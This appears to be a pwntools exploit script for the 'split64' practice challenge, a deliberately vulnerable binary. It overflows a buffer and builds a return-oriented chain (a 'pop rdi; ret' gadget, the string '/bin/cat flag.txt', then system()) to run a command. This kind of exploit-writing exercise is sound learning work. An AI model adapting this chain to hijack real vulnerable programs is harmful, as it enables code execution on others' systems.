from pwn import *


elf = ELF('./split64')

context.terminal=['tmux','sp','-h']
#context.log_level='DEBUG'

io=process(elf.path)
payload= flat(
	'A'*40 ,
	0x400883, #0x0000000000400883: pop rdi; ret;
	elf.search('/bin/cat flag.txt').next(), #0x00601060  17  18 (.data) ascii /bin/cat flag.txt
	elf.sym['system'],
	endianness='little',word_size=64,sign=False)

io.recvuntil('> ')
io.sendline(payload)
io.interactive()
